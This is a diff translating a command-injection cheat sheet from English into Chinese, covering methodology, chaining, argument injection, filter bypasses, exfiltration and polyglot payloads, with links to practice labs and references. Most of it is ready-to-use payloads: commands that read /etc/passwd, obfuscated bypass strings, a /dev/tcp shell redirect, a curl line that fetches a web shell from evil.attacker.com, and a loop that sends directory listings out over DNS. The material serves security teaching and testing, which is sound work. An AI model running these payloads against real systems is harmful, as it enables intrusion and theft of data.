@@ -1,56 +1,58 @@
-# Command Injection
+# 命令注入
 
-> Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+[原文文档](README.en.md)
 
-## Summary
+> 命令注入是一种安全漏洞，允许攻击者在易受攻击的应用程序内执行任意命令。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Basic Commands](#basic-commands)
-    * [Chaining Commands](#chaining-commands)
-    * [Argument Injection](#argument-injection)
-    * [Inside A Command](#inside-a-command)
-* [Filter Bypasses](#filter-bypasses)
-    * [Bypass Without Space](#bypass-without-space)
-    * [Bypass With A Line Return](#bypass-with-a-line-return)
-    * [Bypass With Backslash Newline](#bypass-with-backslash-newline)
-    * [Bypass With Tilde Expansion](#bypass-with-tilde-expansion)
-    * [Bypass With Brace Expansion](#bypass-with-brace-expansion)
-    * [Bypass Characters Filter](#bypass-characters-filter)
-    * [Bypass Characters Filter Via Hex Encoding](#bypass-characters-filter-via-hex-encoding)
-    * [Bypass With Single Quote](#bypass-with-single-quote)
-    * [Bypass With Double Quote](#bypass-with-double-quote)
-    * [Bypass With Backticks](#bypass-with-backticks)
-    * [Bypass With Backslash And Slash](#bypass-with-backslash-and-slash)
-    * [Bypass With $@](#bypass-with-)
-    * [Bypass With $()](#bypass-with--1)
-    * [Bypass With Variable Expansion](#bypass-with-variable-expansion)
-    * [Bypass With Wildcards](#bypass-with-wildcards)
-    * [Bypass With Random Case](#bypass-with-random-case)
-* [Data Exfiltration](#data-exfiltration)
-    * [Time Based Data Exfiltration](#time-based-data-exfiltration)
-    * [Dns Based Data Exfiltration](#dns-based-data-exfiltration)
-* [Polyglot Command Injection](#polyglot-command-injection)
-* [Tricks](#tricks)
-    * [Backgrounding Long Running Commands](#backgrounding-long-running-commands)
-    * [Remove Arguments After The Injection](#remove-arguments-after-the-injection)
-* [Labs](#labs)
-    * [Challenge](#challenge)
-* [References](#references)
+## 概要
 
-## Tools
+* [工具](#工具)
+* [方法论](#方法论)
+    * [基本命令](#基本命令)
+    * [命令链式执行](#命令链式执行)
+    * [参数注入](#参数注入)
+    * [在命令内部](#在命令内部)
+* [过滤器绕过](#过滤器绕过)
+    * [无空格绕过](#无空格绕过)
+    * [使用换行符绕过](#使用换行符绕过)
+    * [使用反斜杠换行绕过](#使用反斜杠换行绕过)
+    * [使用波浪号扩展绕过](#使用波浪号扩展绕过)
+    * [使用大括号扩展绕过](#使用大括号扩展绕过)
+    * [绕过字符过滤器](#绕过字符过滤器)
+    * [通过十六进制编码绕过字符过滤器](#通过十六进制编码绕过字符过滤器)
+    * [使用单引号绕过](#使用单引号绕过)
+    * [使用双引号绕过](#使用双引号绕过)
+    * [使用反引号绕过](#使用反引号绕过)
+    * [使用反斜杠和斜杠绕过](#使用反斜杠和斜杠绕过)
+    * [使用 $@ 绕过](#使用--绕过)
+    * [使用 $() 绕过](#使用--绕过)
+    * [使用变量扩展绕过](#使用变量扩展绕过)
+    * [使用通配符绕过](#使用通配符绕过)
+    * [使用随机大小写绕过](#使用随机大小写绕过)
+* [数据泄露](#数据泄露)
+    * [基于时间的数据泄露](#基于时间的数据泄露)
+    * [基于 DNS 的数据泄露](#基于-dns-的数据泄露)
+* [多语言命令注入](#多语言命令注入)
+* [技巧](#技巧)
+    * [后台运行长时间运行的命令](#后台运行长时间运行的命令)
+    * [在注入后移除参数](#在注入后移除参数)
+* [实验室](#实验室)
+    * [挑战](#挑战)
+* [参考资料](#参考资料)
 
-* [commixproject/commix](https://github.com/commixproject/commix) - Automated All-in-One OS command injection and exploitation tool
-* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - An OOB interaction gathering server and client library
+## 工具
 
-## Methodology
+* [commixproject/commix](https://github.com/commixproject/commix) - 自动化一体化操作系统命令注入和利用工具
+* [projectdiscovery/interactsh](https://github.com/projectdiscovery/interactsh) - 带外交互收集服务器和客户端库
 
-Command injection, also known as shell injection, is a type of attack in which the attacker can execute arbitrary commands on the host operating system via a vulnerable application. This vulnerability can exist when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell. In this context, the system shell is a command-line interface that processes commands to be executed, typically on a Unix or Linux system.
+## 方法论
 
-The danger of command injection is that it can allow an attacker to execute any command on the system, potentially leading to full system compromise.
+命令注入，也称为 shell 注入，是一种攻击类型，攻击者可以通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供数据（表单、cookie、HTTP 头等）传递给系统 shell 时，此漏洞可能存在。在这种上下文中，系统 shell 是一个命令行接口，处理要执行的命令，通常在 Unix 或 Linux 系统上。
 
-**Example of Command Injection with PHP**:
-Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
+命令注入的危险在于它可能允许攻击者在系统上执行任何命令，可能导致完全系统妥协。
+
+**使用 PHP 进行命令注入的示例**：
+假设您有一个 PHP 脚本，它接受用户输入来 ping 指定的 IP 地址或域名：
 
 ```php
 <?php
@@ -59,15 +61,15 @@ Suppose you have a PHP script that takes a user input to ping a specified IP add
 ?>
 ```
 
-In the above code, the PHP script uses the `system()` function to execute the `ping` command with the IP address or domain provided by the user through the `ip` GET parameter.
+在上面的代码中，PHP 脚本使用 `system()` 函数执行 `ping` 命令，该命令使用用户通过 `ip` GET 参数提供的 IP 地址或域名。
 
-If an attacker provides input like `8.8.8.8; cat /etc/passwd`, the actual command that gets executed would be: `ping -c 4 8.8.8.8; cat /etc/passwd`.
+如果攻击者提供像 `8.8.8.8; cat /etc/passwd` 这样的输入，实际执行的命令将是：`ping -c 4 8.8.8.8; cat /etc/passwd`。
 
-This means the system would first `ping 8.8.8.8` and then execute the `cat /etc/passwd` command, which would display the contents of the `/etc/passwd` file, potentially revealing sensitive information.
+这意味着系统将首先 `ping 8.8.8.8`，然后执行 `cat /etc/passwd` 命令，该命令将显示 `/etc/passwd` 文件的内容，可能泄露敏感信息。
 
-### Basic Commands
+### 基本命令
 
-Execute the command and voila :p
+执行命令，就这样 :p
 
 ```powershell
 cat /etc/passwd
@@ -78,28 +80,28 @@ sys:x:3:3:sys:/dev:/bin/sh
 ...
 ```
 
-### Chaining Commands
+### 命令链式执行
 
-In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands.
+在许多命令行界面中，特别是在类似 Unix 的系统中，有几个字符可用于链式执行或操作命令。
 
-* `;` (Semicolon): Allows you to execute multiple commands sequentially.
-* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
-* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
-* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
-* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.
+* `;` (分号)：允许您顺序执行多个命令。
+* `&&` (AND)：仅当第一个命令成功（返回零退出状态）时执行第二个命令。
+* `||` (OR)：仅当第一个命令失败（返回非零退出状态）时执行第二个命令。
+* `&` (后台)：在后台执行命令，允许用户继续使用 shell。
+* `|` (管道)：获取第一个命令的输出并将其用作第二个命令的输入。
 
 ```powershell
-command1; command2   # Execute command1 and then command2
-command1 && command2 # Execute command2 only if command1 succeeds
-command1 || command2 # Execute command2 only if command1 fails
-command1 & command2  # Execute command1 in the background
-command1 | command2  # Pipe the output of command1 into command2
+command1; command2   # 执行 command1 然后执行 command2
+command1 && command2 # 仅当 command1 成功时才执行 command2
+command1 || command2 # 仅当 command1 失败时才执行 command2
+command1 & command2  # 在后台执行 command1
+command1 | command2  # 将 command1 的输出管道到 command2
 ```
 
-### Argument Injection
+### 参数注入
 
-Gain a command execution when you can only append arguments to an existing command.
-Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github.io/argument-injection-vectors/) to find the argument to inject to gain command execution.
+当您只能向现有命令追加参数时，获得命令执行。
+使用此网站 [参数注入向量 - Sonar](https://sonarsource.github.io/argument-injection-vectors/) 找到要注入的参数以获得命令执行。
 
 * Chrome
 
@@ -119,93 +121,93 @@ Use this website [Argument Injection Vectors - Sonar](https://sonarsource.github
     psql -o'|id>/tmp/foo'
     ```
 
-Argument injection can be abused using the [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) technique.
+参数注入可以使用 [worstfit](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/) 技术进行滥用。
 
-In the following example, the payload `＂ --use-askpass=calc ＂` is using **fullwidth double quotes** (U+FF02) instead of the **regular double quotes** (U+0022)
+在下面的示例中，载荷 `＂ --use-askpass=calc ＂` 使用**全角双引号**（U+FF02）而不是**常规双引号**（U+0022）
 
 ```php
 $url = "https://example.tld/" . $_GET['path'] . ".txt";
 system("wget.exe -q " . escapeshellarg($url));
 ```
 
-Sometimes, direct command execution from the injection might not be possible, but you may be able to redirect the flow into a specific file, enabling you to deploy a web shell.
+有时，从注入中直接执行命令可能不可能，但您可能能够将流重定向到特定文件，使您能够部署 web shell。
 
 * curl
 
     ```ps1
-    # -o, --output <file>        Write to file instead of stdout
+    # -o, --output <file>        写入文件而不是 stdout
     curl http://evil.attacker.com/ -o webshell.php
     ```
 
-### Inside A Command
+### 在命令内部
 
-* Command injection using backticks.
+* 使用反引号的命令注入。
 
   ```bash
   original_cmd_by_server `cat /etc/passwd`
   ```
 
-* Command injection using substitution
+* 使用替换的命令注入
 
   ```bash
   original_cmd_by_server $(cat /etc/passwd)
   ```
 
-## Filter Bypasses
+## 过滤器绕过
 
-### Bypass Without Space
+### 无空格绕过
 
-* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead.
+* `$IFS` 是一个称为内部字段分隔符的特殊 shell 变量。默认情况下，在许多 shell 中，它包含空白字符（空格、制表符、换行符）。在命令中使用时，shell 会将 `$IFS` 解释为空格。`$IFS` 在像 `ls`、`wget` 这样的命令中不能直接用作分隔符；改用 `${IFS}`。
 
   ```powershell
   cat${IFS}/etc/passwd
   ls${IFS}-la
   ```
 
-* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
+* 在某些 shell 中，大括号扩展生成任意字符串。执行时，shell 会将大括号内的项目视为独立的命令或参数。
 
   ```powershell
   {cat,/etc/passwd}
   ```
 
-* Input redirection. The < character tells the shell to read the contents of the file specified.
+* 输入重定向。< 字符告诉 shell 读取指定文件的内容。
 
   ```powershell
   cat</etc/passwd
   sh</dev/tcp/127.0.0.1/4242
   ```
 
-* ANSI-C Quoting
+* ANSI-C 引用
 
   ```powershell
   X=$'uname\x20-a'&&$X
   ```
 
-* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
+* 制表符字符有时可以用作空格的替代。在 ASCII 中，制表符字符由十六进制值 `09` 表示。
 
   ```powershell
   ;ls%09-al%09/home
   ```
 
-* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
+* 在 Windows 中，`%VARIABLE:~start,length%` 是用于对环境变量进行子字符串操作的语法。
 
   ```powershell
   ping%CommonProgramFiles:~10,-18%127.0.0.1
   ping%PROGRAMFILES:~10,-5%127.0.0.1
   ```
 
-### Bypass With A Line Return
+### 使用换行符绕过
 
-Commands can also be run in sequence with newlines
+命令也可以通过换行符顺序运行
 
 ```bash
 original_cmd_by_server
 ls
 ```
 
-### Bypass With Backslash Newline
+### 使用反斜杠换行绕过
 
-* Commands can be broken into parts by using backslash followed by a newline
+* 可以通过使用反斜杠后跟换行符将命令分解为部分
 
   ```powershell
   $ cat /et\
@@ -213,20 +215,20 @@ ls
   sswd
   ```
 
-* URL encoded form would look like this:
+* URL 编码形式看起来像这样：
 
   ```powershell
   cat%20/et%5C%0Ac/pa%5C%0Asswd
   ```
 
-### Bypass With Tilde Expansion
+### 使用波浪号扩展绕过
 
 ```powershell
 echo ~+
 echo ~-
 ```
 
-### Bypass With Brace Expansion
+### 使用大括号扩展绕过
 
 ```powershell
 {,ip,a}
@@ -238,9 +240,9 @@ echo ~-
 {,/?s?/?i?/c?t,/e??/p??s??,}
 ```
 
-### Bypass Characters Filter
+### 绕过字符过滤器
 
-Commands execution without backslash and slash - linux bash
+在 linux bash 中无反斜杠和斜杠执行命令
 
 ```powershell
 swissky@crashlab:~$ echo ${HOME:0:1}
@@ -259,7 +261,7 @@ swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')p
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass Characters Filter Via Hex Encoding
+### 通过十六进制编码绕过字符过滤器
 
 ```powershell
 swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
@@ -287,7 +289,7 @@ swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
 ```
 
-### Bypass With Single Quote
+### 使用单引号绕过
 
 ```powershell
 w'h'o'am'i
@@ -295,7 +297,7 @@ wh''oami
 'w'hoami
 ```
 
-### Bypass With Double Quote
+### 使用双引号绕过
 
 ```powershell
 w"h"o"am"i
@@ -303,29 +305,29 @@ wh""oami
 "wh"oami
 ```
 
-### Bypass With Backticks
+### 使用反引号绕过
 
 ```powershell
 wh``oami
 ```
 
-### Bypass With Backslash and Slash
+### 使用反斜杠和斜杠绕过
 
 ```powershell
 w\ho\am\i
 /\b\i\n/////s\h
 ```
 
-### Bypass With $@
+### 使用 $@ 绕过
 
-`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
+`$0`：如果脚本作为脚本运行，则指的是脚本的名称。如果您在交互式 shell 会话中，`$0` 通常会给出 shell 的名称。
 
 ```powershell
 who$@ami
 echo whoami|$0
 ```
 
-### Bypass With $()
+### 使用 $() 绕过
 
 ```powershell
 who$()ami
@@ -333,7 +335,7 @@ who$(echo am)i
 who`echo am`i
 ```
 
-### Bypass With Variable Expansion
+### 使用变量扩展绕过
 
 ```powershell
 /???/??t /???/p??s??
@@ -343,28 +345,28 @@ cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
 ```
 
-### Bypass With Wildcards
+### 使用通配符绕过
 
 ```powershell
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
 
-### Bypass With Random Case
+### 使用随机大小写绕过
 
-Windows does not distinguish between uppercase and lowercase letters when interpreting commands or file paths. For example, `DIR`, `dir`, or `DiR` will all execute the same `dir` command.
+Windows 在解释命令或文件路径时不区分大小写字母。例如，`DIR`、`dir` 或 `DiR` 都会执行相同的 `dir` 命令。
 
 ```powershell
 wHoAmi
 ```
 
-## Data Exfiltration
+## 数据泄露
 
-### Time Based Data Exfiltration
+### 基于时间的数据泄露
 
-Extracting data char by char and detect the correct value based on the delay.
+逐字符提取数据并基于延迟检测正确值。
 
-* Correct value: wait 5 seconds
+* 正确值：等待 5 秒
 
   ```powershell
   swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
@@ -373,7 +375,7 @@ Extracting data char by char and detect the correct value based on the delay.
   sys 0m0.000s
   ```
 
-* Incorrect value: no delay
+* 错误值：无延迟
 
   ```powershell
   swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
@@ -382,95 +384,95 @@ Extracting data char by char and detect the correct value based on the delay.
   sys 0m0.000s
   ```
 
-### Dns Based Data Exfiltration
+### 基于 DNS 的数据泄露
 
-Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
+基于 [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin) 工具，也托管在 [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
 
-1. Go to [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
-2. Execute a simple 'ls'
+1. 转到 [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
+2. 执行一个简单的 'ls'
 
   ```powershell
   for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
   ```
 
-Online tools to check for DNS based data exfiltration:
+检查基于 DNS 的数据泄露的在线工具：
 
 * [dnsbin.zhack.ca](http://dnsbin.zhack.ca)
 * [app.interactsh.com](https://app.interactsh.com)
 * [portswigger.net](https://portswigger.net/burp/documentation/collaborator)
 
-## Polyglot Command Injection
+## 多语言命令注入
 
-A polyglot is a piece of code that is valid and executable in multiple programming languages or environments simultaneously. When we talk about "polyglot command injection," we're referring to an injection payload that can be executed in multiple contexts or environments.
+多语言是在多个编程语言或环境中同时有效和可执行的代码片段。当我们谈论"多语言命令注入"时，我们指的是可以在多个上下文或环境中执行的注入载荷。
 
-* Example 1:
+* 示例 1：
 
   ```powershell
-  Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+  载荷: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 
-  # Context inside commands with single and double quote:
+  # 在带单引号和双引号的命令中的上下文：
   echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
   ```
 
-* Example 2:
+* 示例 2：
 
   ```powershell
-  Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
+  载荷: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 
-  # Context inside commands with single and double quote:
+  # 在带单引号和双引号的命令中的上下文：
   echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
   echo "YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/"
   echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/'
   ```
 
-## Tricks
+## 技巧
 
-### Backgrounding Long Running Commands
+### 后台运行长时间运行的命令
 
-In some instances, you might have a long running command that gets killed by the process injecting it timing out.
-Using `nohup`, you can keep the process running after the parent process exits.
+在某些情况下，您可能有一个长时间运行的命令，它会被注入它的进程超时终止。
+使用 `nohup`，您可以在父进程退出后保持进程运行。
 
 ```bash
 nohup sleep 120 > /dev/null &
 ```
 
-### Remove Arguments After The Injection
+### 在注入后移除参数
 
-In Unix-like command-line interfaces, the `--` symbol is used to signify the end of command options. After `--`, all arguments are treated as filenames and arguments, and not as options.
+在类似 Unix 的命令行界面中，`--` 符号用于表示命令选项的结束。在 `--` 之后，所有参数都被视为文件名和参数，而不是选项。
 
-## Labs
+## 实验室
 
-* [PortSwigger - OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)
-* [PortSwigger - Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
-* [PortSwigger - Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
-* [PortSwigger - Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
-* [PortSwigger - Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
-* [Root Me - PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
-* [Root Me - Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
+* [PortSwigger - 操作系统命令注入，简单案例](https://portswigger.net/web-security/os-command-injection/lab-simple)
+* [PortSwigger - 带时间延迟的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+* [PortSwigger - 带输出重定向的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+* [PortSwigger - 带带外交互的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+* [PortSwigger - 带带外数据泄露的盲操作系统命令注入](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
+* [Root Me - PHP - 命令注入](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
+* [Root Me - 命令注入 - 过滤器绕过](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
 * [Root Me - PHP - assert()](https://www.root-me.org/en/Challenges/Web-Server/PHP-assert)
 * [Root Me - PHP - preg_replace()](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)
 
-### Challenge
+### 挑战
 
-Challenge based on the previous tricks, what does the following command do:
+基于前面技巧的挑战，以下命令的作用是什么：
 
 ```powershell
 g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ```
 
-**NOTE**: The command is safe to run, but you should not trust me.
+**注意**：此命令可以安全运行，但您不应该信任我。
 
-## References
+## 参考资料
 
-* [Argument Injection and Getting Past Shellwords.escape - Etienne Stalmans - November 24, 2019](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
-* [Argument Injection Vectors - SonarSource - February 21, 2023](https://sonarsource.github.io/argument-injection-vectors/)
-* [Back to the Future: Unix Wildcards Gone Wild - Leon Juranic - June 25, 2014](https://www.exploit-db.com/papers/33930)
-* [Bash Obfuscation by String Manipulation - Malwrologist, @DissectMalware - August 4, 2018](https://twitter.com/DissectMalware/status/1025604382644232192)
-* [Bug Bounty Survey - Windows RCE Spaceless - Bug Bounties Survey - May 4, 2017](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
-* [No PHP, No Spaces, No $, No {}, Bash Only - Sven Morgenroth - August 9, 2017](https://twitter.com/asdizzle_/status/895244943526170628)
-* [OS Command Injection - PortSwigger - 2024](https://portswigger.net/web-security/os-command-injection)
-* [SECURITY CAFÉ - Exploiting Timed-Based RCE - Pobereznicenco Dan - February 28, 2017](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
-* [TL;DR: How to Exploit/Bypass/Use PHP escapeshellarg/escapeshellcmd Functions - kacperszurek - April 25, 2018](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
-* [WorstFit: Unveiling Hidden Transformers in Windows ANSI! - Orange Tsai - January 10, 2025](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
+* [参数注入和绕过 Shellwords.escape - Etienne Stalmans - 2019年11月24日](https://staaldraad.github.io/post/2019-11-24-argument-injection/)
+* [参数注入向量 - SonarSource - 2023年2月21日](https://sonarsource.github.io/argument-injection-vectors/)
+* [回到未来：Unix 通配符失控 - Leon Juranic - 2014年6月25日](https://www.exploit-db.com/papers/33930)
+* [通过字符串操作进行 Bash 混淆 - Malwrologist，@DissectMalware - 2018年8月4日](https://twitter.com/DissectMalware/status/1025604382644232192)
+* [漏洞赏金调查 - Windows RCE 无空格 - 漏洞赏金调查 - 2017年5月4日](https://web.archive.org/web/20180808181450/https://twitter.com/bugbsurveys/status/860102244171227136)
+* [无 PHP、无空格、无 $、无 {}、仅 Bash - Sven Morgenroth - 2017年8月9日](https://twitter.com/asdizzle_/status/895244943526170628)
+* [操作系统命令注入 - PortSwigger - 2024年](https://portswigger.net/web-security/os-command-injection)
+* [安全咖啡馆 - 利用基于时间的 RCE - Pobereznicenco Dan - 2017年2月28日](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
+* [TL;DR：如何利用/绕过/使用 PHP escapeshellarg/escapeshellcmd 函数 - kacperszurek - 2018年4月25日](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md)
+* [WorstFit：揭示 Windows ANSI 中的隐藏转换器！ - Orange Tsai - 2025年1月10日](https://blog.orange.tw/posts/2025-01-worstfit-unveiling-hidden-transformers-in-windows-ansi/)
